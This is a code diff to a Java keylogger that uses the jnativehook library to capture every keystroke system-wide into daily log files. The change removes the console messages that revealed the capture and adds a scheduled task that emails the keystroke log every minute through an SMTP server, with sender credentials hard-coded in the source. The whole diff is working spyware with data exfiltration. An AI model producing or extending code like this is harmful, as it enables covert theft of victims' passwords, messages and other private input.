@@ -5,6 +5,9 @@ import java.io.FileWriter;
 import java.io.IOException;
 import java.time.LocalDate;
 import java.time.format.DateTimeFormatter;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
@@ -28,7 +31,6 @@ public class Keylogger  implements NativeKeyListener{
 
 	    @Override
 	    public void nativeKeyPressed(NativeKeyEvent e) {
-	        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 
 	        // If the Escape key is pressed, unregister the native hook
 	        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
@@ -42,13 +44,11 @@ public class Keylogger  implements NativeKeyListener{
 
 	    @Override
 	    public void nativeKeyReleased(NativeKeyEvent e) {
-	        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
 	        
 	        // Write the key release event to the log file
 	        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE_PATH, true))) {
 	            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
 	            writer.newLine(); // Add a new line after each key event
-	            System.out.println("Log file updated successfully!");
 	        } catch (IOException ioException) {
 	            ioException.printStackTrace();
 	        }
@@ -60,10 +60,34 @@ public class Keylogger  implements NativeKeyListener{
 
 	    @Override
 	    public void nativeKeyTyped(NativeKeyEvent e) {
-	        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
 	        if (!LocalDate.now().equals(currentDate)) {
 	            updateLogFilePath();
 	        }
+	    }
+	    
+	    private static void scheduleEmailSending() {
+	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
+	        scheduler.scheduleAtFixedRate(() -> {
+	            try {
+	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
+	                String logFilePath = "C:\\Users\\User\\Documents\\logs\\log-" + LocalDate.now().format(formatter) + ".txt";
+	                
+	                
+	                EmailSender.sendEmail(
+	                    "sandbox.smtp.mailtrap.io", // SMTP server
+	                    "2525",              // SMTP port
+	                    "47d47a8d8b9baf", // Sender email
+	                    "bc64dc52a88f49",    // Sender password
+	                    "recipient_email@example.com", // Recipient email
+	                    "Daily Keylogger Log", // Subject
+	                    "Please find the attached keylogger log for today.", // Message
+	                    logFilePath // Attachment
+	                );
+	                System.out.println("Email sent successfully!");
+	            } catch (Exception e) {
+	                e.printStackTrace();
+	            }
+	        },  0, 1, TimeUnit.MINUTES);
 	    }
 
 	    public static void main(String[] args) {
@@ -82,5 +106,7 @@ public class Keylogger  implements NativeKeyListener{
 
 	        // Add the keylogger as a native key listener
 	        GlobalScreen.addNativeKeyListener(new Keylogger());
+	        
+	        scheduleEmailSending();
 	    }
 	}
